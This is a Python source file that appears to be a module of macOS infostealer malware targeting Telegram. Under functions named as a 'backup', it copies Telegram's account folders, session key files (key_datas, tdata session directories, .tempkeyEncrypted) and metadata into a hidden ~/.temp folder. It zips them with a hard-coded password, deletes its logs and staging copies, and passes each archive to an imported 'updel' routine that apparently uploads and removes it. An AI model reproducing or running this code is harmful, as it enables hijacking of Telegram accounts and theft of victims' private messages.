import os
import shutil
import subprocess
import updel

log_dir = os.path.expanduser("~/.temp/logs/")
log_file_path = os.path.join(log_dir, "tg_process_log.txt")
zip_password = "@*@"

def log(message):
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    with open(log_file_path, "a") as log_file:
        log_file.write(message + "\n")

def zip_folder(folder_path, output_dir, output_name, password=None):
    try:
        folder_path_expanded = os.path.expanduser(folder_path)
        if not os.path.exists(folder_path_expanded):
            log(f"Folder {folder_path_expanded} does not exist")
            return

        output_zip = os.path.join(output_dir, output_name)
        log(f"Zipping folder {folder_path_expanded} to {output_zip}")

        zip_command = ['zip', '-r']
        if password:
            zip_command += ['-P', password]
        zip_command += [output_zip, folder_path_expanded]

        with subprocess.Popen(zip_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as proc:
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                log(f"Error in zip process: {stderr.decode('utf-8')}")
            else:
                log(f"Zipped folder successfully: {stdout.decode('utf-8')}")
    except Exception as e:
        log(f"Error in zip_folder: {e}")

def zip_folder_with_logs(folder_path, output_dir, output_name, password=None):
    try:
        folder_path_expanded = os.path.expanduser(folder_path)
        if not os.path.exists(folder_path_expanded):
            log(f"Folder {folder_path_expanded} does not exist")
            return

        output_zip = os.path.join(output_dir, output_name)
        log(f"Zipping folder {folder_path_expanded} with logs to {output_zip}")

        zip_command = ['zip', '-r']
        if password:
            zip_command += ['-P', password]
        zip_command += [output_zip, folder_path_expanded, log_dir]

        with subprocess.Popen(zip_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as proc:
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                log(f"Error in zip process: {stderr.decode('utf-8')}")
            else:
                log(f"Zipped folder with logs successfully: {stdout.decode('utf-8')}")

        # Logs klasörünü temizle
        shutil.rmtree(log_dir)
    except Exception as e:
        log(f"Error in zip_folder_with_logs: {e}")

def copy_files(source_dir, dest_dir, file_condition=None):
    if not os.path.exists(source_dir):
        log(f"Source directory {source_dir} does not exist")
        return

    for root, dirs, files in os.walk(source_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if file_condition and not file_condition(file_path):
                continue

            dest_path = os.path.join(dest_dir, os.path.relpath(file_path, source_dir))
            dest_folder = os.path.dirname(dest_path)

            if not os.path.exists(dest_folder):
                os.makedirs(dest_folder)

            shutil.copy(file_path, dest_path)
            log(f"Copied {file_path} to {dest_path}")

def copy_telegram_files(base_dest_dir, source_dir, dest_subdir_name, additional_files):
    try:
        source_dir_expanded = os.path.expanduser(source_dir)
        dest_dir = os.path.join(base_dest_dir, dest_subdir_name)

        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir)

        if not os.path.exists(source_dir_expanded):
            log(f"Source directory {source_dir_expanded} does not exist")
            return

        for item in os.listdir(source_dir_expanded):
            item_path = os.path.join(source_dir_expanded, item)
            if os.path.isdir(item_path) and item.startswith("account-"):
                dest_account_path = os.path.join(dest_dir, item)
                if not os.path.exists(dest_account_path):
                    os.makedirs(dest_account_path)
                for sub_item in os.listdir(item_path):
                    sub_item_path = os.path.join(item_path, sub_item)
                    if sub_item == "postbox" and os.path.isdir(sub_item_path):
                        dest_postbox_path = os.path.join(dest_account_path, "postbox")
                        if not os.path.exists(dest_postbox_path):
                            os.makedirs(dest_postbox_path)
                        for postbox_sub_item in os.listdir(sub_item_path):
                            if postbox_sub_item == "media":
                                continue
                            postbox_sub_item_path = os.path.join(sub_item_path, postbox_sub_item)
                            if os.path.isdir(postbox_sub_item_path):
                                shutil.copytree(postbox_sub_item_path, os.path.join(dest_postbox_path, postbox_sub_item))
                            else:
                                shutil.copy(postbox_sub_item_path, dest_postbox_path)
                    else:
                        if os.path.isdir(sub_item_path):
                            shutil.copytree(sub_item_path, os.path.join(dest_account_path, sub_item))
                        else:
                            shutil.copy(sub_item_path, dest_account_path)

        for filename in additional_files:
            file_path = os.path.join(source_dir_expanded, filename)
            if os.path.exists(file_path):
                shutil.copy(file_path, dest_dir)

        accounts_metadata_path = os.path.join(source_dir_expanded, "accounts-metadata")
        if os.path.exists(accounts_metadata_path) and os.path.isdir(accounts_metadata_path):
            shutil.copytree(accounts_metadata_path, os.path.join(dest_dir, "accounts-metadata"))

        zip_file_path = os.path.join(base_dest_dir, f"{dest_subdir_name}.zip")
        zip_folder_with_logs(dest_dir, base_dest_dir, f"{dest_subdir_name}.zip", zip_password)
        shutil.rmtree(dest_dir)
        updel.process_file(zip_file_path)
    except Exception as e:
        log(f"Error in copy_telegram_files for {source_dir}: {e}")

def create_and_process_tdata_zips(base_dest_dir, source_dirs):
    try:
        zip_counter = 1
        zip_files = []
        for source_dir in source_dirs:
            source_dir_expanded = os.path.expanduser(source_dir)
            dest_dir_name = f"tdata{zip_counter}" if zip_counter > 1 else "tdata"
            dest_dir = os.path.join(base_dest_dir, dest_dir_name)

            if not os.path.exists(dest_dir):
                os.makedirs(dest_dir)

            if not os.path.exists(source_dir_expanded):
                log(f"Source directory {source_dir_expanded} does not exist")
                continue

            for item in os.listdir(source_dir_expanded):
                item_path = os.path.join(source_dir_expanded, item)
                if os.path.isdir(item_path) and len(item) == 16:
                    shutil.copytree(item_path, os.path.join(dest_dir, item))

            key_datas_path = os.path.join(source_dir_expanded, "key_datas")
            if os.path.exists(key_datas_path):
                shutil.copy(key_datas_path, dest_dir)

            for item in os.listdir(source_dir_expanded):
                if len(item) == 16:
                    new_filename = item + 's'
                    new_file_path = os.path.join(source_dir_expanded, new_filename)
                    if os.path.exists(new_file_path):
                        shutil.copy(new_file_path, dest_dir)

            zip_file_path = os.path.join(base_dest_dir, f"{dest_dir_name}.zip")
            zip_folder(dest_dir, base_dest_dir, f"{dest_dir_name}.zip", zip_password)
            zip_files.append(zip_file_path)
            shutil.rmtree(dest_dir)
            zip_counter += 1

        zip_files.sort(key=lambda x: os.path.getsize(x))
        for zip_file in zip_files:
            updel.process_file(zip_file)

    except Exception as e:
        log(f"Error in create_and_process_tdata_zips: {e}")

def backup_telegram():
    base_dest_dir = os.path.expanduser("~/.temp/")
    if not os.path.exists(base_dest_dir):
        os.makedirs(base_dest_dir)

    telegram_source_dir = "~/Library/Group Containers/6N38VWS5BX.ru.keepcoder.Telegram/appstore/"
    telegram_additional_files = ["accounts-shared-data", ".tempkeyEncrypted", ".com.apple.containermanagerd.metadata.plist"]
    copy_telegram_files(base_dest_dir, telegram_source_dir, "telegram", telegram_additional_files)

def backup_tdata():
    base_dest_dir = os.path.expanduser("~/.temp/")
    if not os.path.exists(base_dest_dir):
        os.makedirs(base_dest_dir)

    tglightdata_source_dirs = [
        "~/Library/Containers/org.telegram.desktop/Data/Library/Application Support/Telegram Desktop/tdata",
        "~/Library/Application Support/Telegram Desktop/tdata"
    ]
    create_and_process_tdata_zips(base_dest_dir, tglightdata_source_dirs)
